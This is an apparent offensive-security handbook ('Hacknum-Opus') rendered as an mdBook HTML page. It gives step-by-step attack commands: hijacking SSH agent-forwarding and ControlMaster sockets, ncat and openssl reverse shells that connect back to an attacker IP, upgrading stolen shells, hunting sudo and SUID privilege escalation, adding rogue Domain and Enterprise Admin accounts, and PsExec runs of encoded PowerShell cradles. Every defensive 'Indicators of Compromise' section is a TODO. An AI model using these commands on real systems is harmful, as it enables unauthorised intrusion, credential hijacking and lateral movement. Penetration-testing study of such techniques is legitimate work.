@@ -1,0 +1,720 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Hacknum-Opus</title>
+                <meta name="robots" content="noindex" />
+                
+
+        <!-- Custom HTML head -->
+        
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+                <link rel="icon" href="favicon.svg">
+                        <link rel="shortcut icon" href="favicon.png">
+                <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+                <link rel="stylesheet" href="css/print.css" media="print">
+        
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+                <link rel="stylesheet" href="fonts/fonts.css">
+        
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        
+            </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="SUMMARY.html"><strong aria-hidden="true">1.</strong> Table of Contents</a></li><li class="chapter-item expanded "><a href="SSH_HIJACKING_SUMMARY.html"><strong aria-hidden="true">2.</strong> SSH Hijacking</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="hijacking_ssh-agent_forwarding.html"><strong aria-hidden="true">2.1.</strong> SSH-Agent Forwarding</a></li><li class="chapter-item expanded "><a href="hijacking_ssh_controlmaster.html"><strong aria-hidden="true">2.2.</strong> ControlMaster</a></li></ol></li><li class="chapter-item expanded "><a href="REVERSE_SHELLS_SUMMARY.html"><strong aria-hidden="true">3.</strong> Reverse Shells</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="netcat_ssl.html"><strong aria-hidden="true">3.1.</strong> Netcat with SSL</a></li><li class="chapter-item expanded "><a href="upgrade_magic.html"><strong aria-hidden="true">3.2.</strong> Upgrading Shells with Magic</a></li></ol></li><li class="chapter-item expanded "><a href="LINUX_SUMMARY.html"><strong aria-hidden="true">4.</strong> Linux</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="LINUX_PRIVESC_SUMMARY.html"><strong aria-hidden="true">4.1.</strong> Privilege Escalation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="linux_gtfobins.html"><strong aria-hidden="true">4.1.1.</strong> SUDO/SUID/etc</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="WINDOWS_SUMMARY.html"><strong aria-hidden="true">5.</strong> Windows</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="WINDOWS_STEALTH_SUMMARY.html"><strong aria-hidden="true">5.1.</strong> Stealth</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="windows_reflective_pe_loader.html"><strong aria-hidden="true">5.1.1.</strong> Reflective PE Loader</a></li></ol></li><li class="chapter-item expanded "><a href="WINDOWS_LATERAL_MOVEMENT_SUMMARY.html"><strong aria-hidden="true">5.2.</strong> Lateral Movement</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="psexec.html"><strong aria-hidden="true">5.2.1.</strong> PSExec</a></li><li class="chapter-item expanded "><a href="mof_upload.html"><strong aria-hidden="true">5.2.2.</strong> MOF Upload</a></li><li class="chapter-item expanded "><a href="winrm.html"><strong aria-hidden="true">5.2.3.</strong> WinRM</a></li></ol></li><li class="chapter-item expanded "><a href="WINDOWS_PERSISTENCE_SUMMARY.html"><strong aria-hidden="true">5.3.</strong> Persistence</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="invisreg.html"><strong aria-hidden="true">5.3.1.</strong> Invisible Registry Keys</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="ACTIVE_DIRECTORY_SUMMARY.html"><strong aria-hidden="true">6.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="ACTIVE_DIRECTORY_VULNERABILITIES.html"><strong aria-hidden="true">6.1.</strong> Vulnerabilities</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="zerologon.html"><strong aria-hidden="true">6.1.1.</strong> Zerologon (CVE-2020-1472)</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="IMPACT_SUMMARY.html"><strong aria-hidden="true">7.</strong> Impact</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="website_defacement.html"><strong aria-hidden="true">7.1.</strong> Website Defacement</a></li></ol></li></ol>            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                                                <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                                            </div>
+
+                    <h1 class="menu-title">Hacknum-Opus</h1>
+
+                    <div class="right-buttons">
+                                                <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                                                                        
+                    </div>
+                </div>
+
+                                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="summary"><a class="header" href="#summary">Summary</a></h1>
+<ul>
+<li><a href="./SUMMARY.html">Table of Contents</a></li>
+<li><a href="SSH_HIJACKING_SUMMARY.html">SSH Hijacking</a>
+<ul>
+<li><a href="./hijacking_ssh-agent_forwarding.html">SSH-Agent Forwarding</a></li>
+<li><a href="./hijacking_ssh_controlmaster.html">ControlMaster</a></li>
+</ul>
+</li>
+<li><a href="./REVERSE_SHELLS_SUMMARY.html">Reverse Shells</a>
+<ul>
+<li><a href="./netcat_ssl.html">Netcat with SSL</a></li>
+<li><a href="./upgrade_magic.html">Upgrading Shells with Magic</a></li>
+</ul>
+</li>
+<li><a href="./LINUX_SUMMARY.html">Linux</a>
+<ul>
+<li><a href="./LINUX_PRIVESC_SUMMARY.html">Privilege Escalation</a>
+<ul>
+<li><a href="./linux_gtfobins.html">SUDO/SUID/etc</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="./WINDOWS_SUMMARY.html">Windows</a>
+<ul>
+<li><a href="./WINDOWS_STEALTH_SUMMARY.html">Stealth</a>
+<ul>
+<li><a href="./windows_reflective_pe_loader.html">Reflective PE Loader</a></li>
+</ul>
+</li>
+<li><a href="./WINDOWS_LATERAL_MOVEMENT_SUMMARY.html">Lateral Movement</a>
+<ul>
+<li><a href="./psexec.html">PSExec</a></li>
+<li><a href="./mof_upload.html">MOF Upload</a></li>
+<li><a href="./winrm.html">WinRM</a></li>
+</ul>
+</li>
+<li><a href="./WINDOWS_PERSISTENCE_SUMMARY.html">Persistence</a>
+<ul>
+<li><a href="./invisreg.html">Invisible Registry Keys</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="./ACTIVE_DIRECTORY_SUMMARY.html">Active Directory</a>
+<ul>
+<li><a href="./ACTIVE_DIRECTORY_VULNERABILITIES.html">Vulnerabilities</a>
+<ul>
+<li><a href="./zerologon.html">Zerologon (CVE-2020-1472)</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="./IMPACT_SUMMARY.html">Impact</a>
+<ul>
+<li><a href="./website_defacement.html">Website Defacement</a></li>
+</ul>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="ssh-hijacking"><a class="header" href="#ssh-hijacking">SSH Hijacking</a></h1>
+<ul>
+<li><a href="./hijacking_ssh-agent_forwarding.html">SSH-Agent Forwarding</a></li>
+<li><a href="./hijacking_ssh_controlmaster.html">ControlMaster</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="ssh-hijacking-with-ssh-agent-forwarding"><a class="header" href="#ssh-hijacking-with-ssh-agent-forwarding">SSH Hijacking With SSH-Agent Forwarding</a></h1>
+<h2 id="summary-1"><a class="header" href="#summary-1">Summary</a></h2>
+<p>SSH-Agent is a utility that keeps track of a user's private keys and allows them to be used without having to repeat their passphrases on every connection. SSH agent forwarding is a mechanism that allows a user to use the SSH-Agent on an intermediate server as if it were their own local agent on their originating machine. This is useful in situations where a user might need to ssh from an intermediate host into another network segment, which can't be directly accessed from the originating machine. It has the advantage of not requiring the private key to be stored on the intermediate server and the user does not need to enter their passphrase more than once.</p>
+<p>SSH Hijacking is when you take control over the existing SSH session using the socket that gets created. In this scenario, the user will be logged into the intermediate server that's handling the SSH-Agent. Due to the intermediate server assuming the logged in user has already entered the passphrase(s) for the target computers, this technique allows an attacker to log in to every system that trusts the intermediate server without knowing the passphrase to the private key file.</p>
+<h2 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h2>
+<p>A client, intermediate server, and at least one target must be used for this attack, each one requires SSH to be installed and must support SSH-Agent Forwarding. The client must be logged into the intermediate server and has entered the passphrase at least once, and must not close their connection to the server.</p>
+<h2 id="setup"><a class="header" href="#setup">Setup</a></h2>
+<p>In this setup, there will be three hosts; client, intermediate, and target. The intermediate host will house the SSH-Agent forwarding. The public key needs to be installed on both intermediate and target. The keys can be generated and uploaded with the following commands on the client:</p>
+<pre><code class="language-bash">ssh-keygen
+ssh-copy-id -i /path/to/created/key.pub user@intermediate
+ssh-copy-id -i /path/to/created/key.pub user@target
+</code></pre>
+<p>Next, SSH needs to be told to use a forwarded agent. Ensure the following is set in ~/.ssh/config:</p>
+<pre><code class="language-config">ForwardAgent yes
+</code></pre>
+<p>Activate the agent and add the generated keys with the following commands on the client, ssh-add will prompt for the passphrase for the key:</p>
+<pre><code class="language-bash">eval `ssh-agent`
+ssh-add /path/to/created/key.pub
+</code></pre>
+<p>Now, on the intermediate server, the following must be set in /etc/ssh/sshd_config:</p>
+<pre><code class="language-config">AllowAgentForwarding yes
+</code></pre>
+<p>The client must log into the intermediate server, and keep this connection alive. The client must also enter the passphrase at least once so that SSH-Agent will remember the client being authenticated, so it will not prompt for the passphrase during execution.</p>
+<h2 id="execution"><a class="header" href="#execution">Execution</a></h2>
+<h3 id="method-1---low-privileges"><a class="header" href="#method-1---low-privileges">Method 1 - Low Privileges</a></h3>
+<p>This method only works if the user you have compromised has an active SSH session to the intermediate server, if you can not authenticate as the user that does have the session, then you will need root privileges.</p>
+<p>Since you are effectively the user you have compromised, simply running the following commands will allow you to gain access to any target system that's been configured for SSH-Agent Forwarding for this user:</p>
+<pre><code class="language-bash">ssh user@intermediate # On the client
+ssh user@target # On the intermediate server
+</code></pre>
+<h4 id="indicators-of-compromise"><a class="header" href="#indicators-of-compromise">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<h3 id="method-2---root-privileges"><a class="header" href="#method-2---root-privileges">Method 2 - Root Privileges</a></h3>
+<p>One way to perform this method is simply to use the su or sudo command to become that user, and then following method 1. However, to avoid running these commands as they do populate logs on Linux by default, this method will outline how to do it from root alone <strong>FROM THE INTERMEDIATE SERVER</strong>.</p>
+<p>The first step is to find an active SSH session as any user on the box, and fetching the environment variables from all of it's children PID's. This can be done with the following commands:</p>
+<pre><code class="language-bash">ps aux | grep ssh  # Find the user who has an active session
+pstree -p user | grep ssh # Find the list of PID's following that session
+cat /proc/PID/environ | tr '\0' '\n' | grep &quot;SSH&quot;
+</code></pre>
+<p>If the output from the last command contains &quot;SSH_AUTH_SOCK&quot;, then it's value will likely work for this method. It should contain a file path to a socket, to abuse this as root (or if the file permissions on the socket are insecure somehow) then the following commands can be used:</p>
+<pre><code class="language-bash">SSH_AUTH_SOCK=/tmp/ssh-randomstring/agent.number ssh-add -l
+SSH_AUTH_SOCK=/tmp/ssh-randomstring/agent.number ssh user@target
+</code></pre>
+<h4 id="indicators-of-compromise-1"><a class="header" href="#indicators-of-compromise-1">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="hijacking-ssh-with-controlmaster"><a class="header" href="#hijacking-ssh-with-controlmaster">Hijacking SSH With ControlMaster</a></h1>
+<h2 id="summary-2"><a class="header" href="#summary-2">Summary</a></h2>
+<p>ControlMaster is a feature that enables sharing of multiple SSH sessions over a single network connection. This functionality can be enabled for a given user by editing their local SSH configuration file in ~/.ssh/config. This will create a socket that can be used without authentication on the client.</p>
+<h2 id="prerequisites-1"><a class="header" href="#prerequisites-1">Prerequisites</a></h2>
+<p>A client must have SSH installed, with the ability to configure ControlMaster, and the connection must have been made at least once depending on the ControlPersist setting used.</p>
+<h2 id="setup-1"><a class="header" href="#setup-1">Setup</a></h2>
+<p>To configure ControlMaster, place the following into the clients local SSH config, located at ~/.ssh/config:</p>
+<pre><code class="language-config">Host *
+        ControlPath ~/.ssh/controlmaster/%r@%h:%p
+        ControlMaster auto
+        ControlPersist 10m
+</code></pre>
+<p>if ControlPersist is set to yes, it will never close even when the SSH connection is closed. Otherwise, it will last for the duration this is set to after the connection is closed.</p>
+<h2 id="execution-1"><a class="header" href="#execution-1">Execution</a></h2>
+<h3 id="method-1---using-the-controlmaster-socket"><a class="header" href="#method-1---using-the-controlmaster-socket">Method 1 - Using the ControlMaster Socket</a></h3>
+<p>To abuse this, run the following command on the client to hijack the ControlMaster socket:</p>
+<pre><code class="language-bash">ssh -S /home/user/.ssh/controlmaster/user\@target\:port user@target
+</code></pre>
+<h4 id="indicators-of-compromise-2"><a class="header" href="#indicators-of-compromise-2">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse-shells"><a class="header" href="#reverse-shells">Reverse Shells</a></h1>
+<ul>
+<li><a href="./netcat_ssl.html">Netcat with SSL</a></li>
+<li><a href="./upgrade_magic.html">Upgrading Shells with Magic</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="netcat-with-ssl"><a class="header" href="#netcat-with-ssl">Netcat with SSL</a></h1>
+<h2 id="summary-3"><a class="header" href="#summary-3">Summary</a></h2>
+<p>This will outline how to use a normal netcat shell except the traffic is encrypted with SSL.</p>
+<h2 id="prerequisites-2"><a class="header" href="#prerequisites-2">Prerequisites</a></h2>
+<p>Any operating system that has NMAP support, as the ncat package is shipped with NMAP.</p>
+<h2 id="setup-2"><a class="header" href="#setup-2">Setup</a></h2>
+<p>Install NMAP and ensure the ncat command is present</p>
+<h2 id="execution-2"><a class="header" href="#execution-2">Execution</a></h2>
+<h3 id="method-1---reverse-shell-listener-linuxmac"><a class="header" href="#method-1---reverse-shell-listener-linuxmac">Method 1 - Reverse Shell Listener Linux/Mac</a></h3>
+<p>Start up the reverse shell listener with the following command:</p>
+<pre><code class="language-bash">ncat --ssl -lvnp &lt;port&gt;
+</code></pre>
+<p>If the target has ncat as well, run the following command on the target:</p>
+<pre><code class="language-bash">ncat --ssl &lt;attacker ip&gt; &lt;attcker port&gt;
+</code></pre>
+<p>Otherwise, if they have openssl on linux/mac, use the following command:</p>
+<pre><code class="language-bash">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | openssl s_client -connect &lt;attacker ip&gt;:&lt;attacker port&gt; 2&gt;&amp;1 &gt; /tmp/f &amp; disown
+</code></pre>
+<h4 id="indicators-of-compromise-3"><a class="header" href="#indicators-of-compromise-3">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<h3 id="method-2---reverse-shell-listener-windows"><a class="header" href="#method-2---reverse-shell-listener-windows">Method 2 - Reverse Shell Listener Windows</a></h3>
+<p>I highly recommend you use the following command, but if you don't want or need <code>rlwrap</code>, simply omit it from the following command:</p>
+<pre><code class="language-bash">rlwrap ncat --ssl -lvnp &lt;port&gt;
+</code></pre>
+<p>If the target has ncat as well, run the following command on the target:</p>
+<pre><code class="language-bash">ncat --ssl &lt;attacker ip&gt; &lt;attcker port&gt;
+</code></pre>
+<p>Otherwise, you can use <a href="https://github.com/nukingdragons/RevShells">these</a> powershell reverse shells, either &quot;TCPReverseSSL-AddType&quot; or &quot;TCPReverseShell-Reflective&quot; (AddType drops stuff to disk, reflective is less portable and may require tinkering), and then run them through a powershell cradle or otherwise to fetch a reverse shell.</p>
+<h4 id="indicators-of-compromise-4"><a class="header" href="#indicators-of-compromise-4">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="upgrading-shells-with-magic"><a class="header" href="#upgrading-shells-with-magic">Upgrading Shells with Magic</a></h1>
+<h2 id="summary-4"><a class="header" href="#summary-4">Summary</a></h2>
+<p>When using a raw shell, using netcat or something similar, usually this shell does not have an associated TTY, and can be killed accidentally with Ctrl+C. There are a few ways to fix both of these issues to stabilize the shell.</p>
+<h2 id="prerequisites-3"><a class="header" href="#prerequisites-3">Prerequisites</a></h2>
+<p>Some form of raw shell, C2 frameworks won't work with the magic portion, but may work with the TTY portion.</p>
+<h2 id="setup-3"><a class="header" href="#setup-3">Setup</a></h2>
+<p>Obtain a shell from a linux or mac based host through some means. If you have a windows shell, then fetch another by wrapping your listener with the <code>rlwrap</code> command. That's the best you'll get on Windows.</p>
+<h2 id="execution-3"><a class="header" href="#execution-3">Execution</a></h2>
+<h3 id="method-1---python-tty--magic"><a class="header" href="#method-1---python-tty--magic">Method 1 - Python TTY + Magic</a></h3>
+<p>The first step is to obtain a working TTY in the shell using python, use the following command:</p>
+<pre><code class="language-bash">python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<p>With a TTY created, we can perform &quot;Magic&quot; to upgrade the shell such that Ctrl+C, tab completion, etc, gets forwarded to the shell instead of being handled locally.</p>
+<p>First, press Ctrl+Z to background the process. Then, run the following command and note down the <em>rows</em> and <em>columns</em> from the output:</p>
+<pre><code class="language-bash">stty -a
+</code></pre>
+<p>Now, run the following command. The semicolon is important:</p>
+<pre><code class="language-bash">stty raw -echo; fg
+</code></pre>
+<p>Press enter to regain control of the netcat shell, and then run the following commands:</p>
+<pre><code class="language-bash">reset
+export TERM=xterm
+stty rows &lt;rows&gt; cols &lt;columns&gt;
+</code></pre>
+<p>Now, your reverse shell should function like any other shell, with tab completion and Ctrl+C support, you should also be able to clear the screen and use editors like vim. If you resize the terminal, you may need to update the rows and columns with <code>stty</code>.</p>
+<h4 id="indicators-of-compromise-5"><a class="header" href="#indicators-of-compromise-5">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<h3 id="method-2---script-tty---magic"><a class="header" href="#method-2---script-tty---magic">Method 2 - Script TTY  + Magic</a></h3>
+<p>The first step is to obtain a working TTY in the shell using script, use the following command:</p>
+<pre><code class="language-bash">script -q /dev/null -c /bin/bash
+</code></pre>
+<p>With a TTY created, we can perform &quot;Magic&quot; to upgrade the shell such that Ctrl+C, tab completion, etc, gets forwarded to the shell instead of being handled locally.</p>
+<p>First, press Ctrl+Z to background the process. Then, run the following command and note down the <em>rows</em> and <em>columns</em> from the output:</p>
+<pre><code class="language-bash">stty -a
+</code></pre>
+<p>Now, run the following command. The semicolon is important:</p>
+<pre><code class="language-bash">stty raw -echo; fg
+</code></pre>
+<p>Press enter to regain control of the netcat shell, and then run the following commands:</p>
+<pre><code class="language-bash">reset
+export TERM=xterm
+stty rows &lt;rows&gt; cols &lt;columns&gt;
+</code></pre>
+<p>Now, your reverse shell should function like any other shell, with tab completion and Ctrl+C support, you should also be able to clear the screen and use editors like vim. If you resize the terminal, you may need to update the rows and columns with <code>stty</code>.</p>
+<h4 id="indicators-of-compromise-6"><a class="header" href="#indicators-of-compromise-6">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="linux"><a class="header" href="#linux">Linux</a></h1>
+<ul>
+<li><a href="./LINUX_PRIVESC_SUMMARY.html">Privilege Escalation</a>
+<ul>
+<li><a href="./linux_gtfobins.html">SUDO/SUID/etc</a></li>
+</ul>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="linux-privilege-escalation"><a class="header" href="#linux-privilege-escalation">Linux Privilege Escalation</a></h1>
+<ul>
+<li><a href="./linux_gtfobins.html">SUDO/SUID/etc</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sudosuidetc"><a class="header" href="#sudosuidetc">SUDO/SUID/etc</a></h1>
+<h2 id="summary-5"><a class="header" href="#summary-5">Summary</a></h2>
+<p>One of the easiest and quickest privilege escalation techniques is to check if there is a vulnerable misconfiguration in the /etc/sudoers file, or if a known program contains the set-UID bit that may retain privileges. There are more than just sudo or SUID vulnerabilities on GTFOBins, so review the website for any additional abuse of privileges.</p>
+<h2 id="prerequisites-4"><a class="header" href="#prerequisites-4">Prerequisites</a></h2>
+<p>The only prerequisite is that the box has either sudo or SUID support for either of those specific vulnerabilities, though these are not the only vulnerabilities that could lead to privesc.</p>
+<h2 id="setup-4"><a class="header" href="#setup-4">Setup</a></h2>
+<p>To configure a box to be vulnerable to one of these methods, check https://gtfobins.github.io/ and select the binary and vulnerability type that you'd like to implement.</p>
+<h2 id="execution-4"><a class="header" href="#execution-4">Execution</a></h2>
+<h3 id="method-1---sudo"><a class="header" href="#method-1---sudo">Method 1 - SUDO</a></h3>
+<p>For this method, the users password must be known <em>or</em> the user must have the NOPASSWD flag set in /etc/sudoers, i.e.:</p>
+<pre><code class="language-sudoers">...
+
+root ALL=(ALL:ALL) ALL
+# EVERYTHING ran without a password
+user1 ALL=(ALL:ALL) NOPASSWD: ALL
+# Specific program doesnt require a password
+user2 ALL=(ALL:ALL) NOPASSWD: /usr/bin/vi
+...
+</code></pre>
+<p>Then simply click &quot;SUDO&quot; or type &quot;+sudo&quot; followed by the program(s) listed in the output of <code>sudo -l</code>. Then follow the specific instructions for that binary to exploit the misconfiguration.</p>
+<p><img src="./images/Pasted%20image%2020230522135640.png" alt="image" /></p>
+<h4 id="indicators-of-compromise-7"><a class="header" href="#indicators-of-compromise-7">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<h3 id="method-2---suid"><a class="header" href="#method-2---suid">Method 2 - SUID</a></h3>
+<p>This method is almost identical to sudo, but rather than running <code>sudo -l</code>, the following command(s) can be used to determine if the SUID bit is set:</p>
+<pre><code class="language-bash"># The program will run as the owner of the file
+find / -perm -4000 -ls 2&gt;/dev/null
+
+# The program will run as the group of the file
+find / -perm -2000 -ls 2&gt;/dev/null
+
+# The program will run as both the owner and the group
+find / -perm -6000 -ls 2&gt;/dev/null
+</code></pre>
+<p>Once a program has been identified from one or more of the commands above, plugging them into GTFOBins with &quot;+suid&quot; will determine if the machine is vulnerable to this misconfiguration.</p>
+<h4 id="indicators-of-compromise-8"><a class="header" href="#indicators-of-compromise-8">Indicators of Compromise</a></h4>
+<p>TODO</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="windows"><a class="header" href="#windows">Windows</a></h1>
+<ul>
+<li><a href="./WINDOWS_STEALTH_SUMMARY.html">Stealth</a>
+<ul>
+<li><a href="./windows_reflective_pe_loader.html">Reflective PE Loader</a></li>
+</ul>
+</li>
+<li><a href="./WINDOWS_LATERAL_MOVEMENT_SUMMARY.html">Lateral Movement</a>
+<ul>
+<li><a href="./psexec.html">PSExec</a></li>
+<li><a href="./mof_upload.html">MOF Upload</a></li>
+<li><a href="./winrm.html">WinRM</a></li>
+</ul>
+</li>
+<li><a href="./WINDOWS_PERSISTENCE_SUMMARY.html">Persistence</a>
+<ul>
+<li><a href="./invisreg.html">Invisible Registry Keys</a></li>
+</ul>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-stealth"><a class="header" href="#windows-stealth">Windows Stealth</a></h1>
+<ul>
+<li><a href="./windows_reflective_pe_loader.html">Reflective PE Loader</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-reflective-pe-loader"><a class="header" href="#windows-reflective-pe-loader">Windows Reflective PE Loader</a></h1>
+<p>TODO</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-lateral-movement"><a class="header" href="#windows-lateral-movement">Windows Lateral Movement</a></h1>
+<ul>
+<li><a href="./psexec.html">PsExec</a></li>
+<li><a href="./mof_upload.html">MOF Upload</a></li>
+<li><a href="./winrm.html">WinRM</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="psexec"><a class="header" href="#psexec">PsExec</a></h1>
+<h2 id="summary-6"><a class="header" href="#summary-6">Summary</a></h2>
+<p>PsExec is a light-weight telnet-replacement that lets you execute processes on other Windows systems, complete with full interactivity for console applications, without having to manually install client software.</p>
+<h2 id="prerequisites-5"><a class="header" href="#prerequisites-5">Prerequisites</a></h2>
+<p>The target must be a Windows based operating system, and the C$ or ADMIN$ share (or equivalent share into C:\Windows\System32) must be <em>writable</em>. If a network share is not available, see <a href="./mof_upload.html">MOF Upload</a>, an alternative to PsExec.</p>
+<h2 id="setup-5"><a class="header" href="#setup-5">Setup</a></h2>
+<p>To set up, either obtain and utilize Administrator credentials to the share(s) in question, or make them writable by modifying user permissions in the Sharing tab on windows. To create a user that can access C$ or ADMIN$, use the following command as Administrator:</p>
+<pre><code class="language-cmd">net user kevin.beacon securepassword /add
+net localgroup Administrators kevin.beacon /add
+</code></pre>
+<p>If within an active directory environment, you may add the user to either &quot;Domain Admins&quot; for the current tree in the forest, or &quot;Enterprise Admins&quot; for the entire forest.</p>
+<pre><code class="language-cmd">net group &quot;Domain Admins&quot; kevin.beacon /add /domain
+net group &quot;Enterprise Admins&quot; kevin.beacon /add /domain
+</code></pre>
+<h2 id="execution-5"><a class="header" href="#execution-5">Execution</a></h2>
+<h3 id="method-1---sysinternals"><a class="header" href="#method-1---sysinternals">Method 1 - Sysinternals</a></h3>
+<p>From a Windows client, the <a href="https://learn.microsoft.com/en-us/sysinternals/">Sysinternals</a> suite can be used to execute arbitrary programs on the target machine. Use <code>-s</code> to run the command as NT AUTHORITY\SYSTEM, and use <code>-i</code> to make it interactive, though this will almost certainly break in a reverse shell. Though, using this flag also gives some useful output even when spawning a reverse shell through PsExec, which is why it is listed below.</p>
+<pre><code class="language-cmd">.\psexec.exe -accepteula -u user -p password -s -i \\remote.server.com cmd /c %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe -enc &lt;base64 encoded cradle&gt;
+</code></pre>
+<h4 id="indicators-of-compromise-9"><a class="header" href="#indicators-of-compromise-9">Indicators of Compromise</a></h4>
+<p>TODO</p>
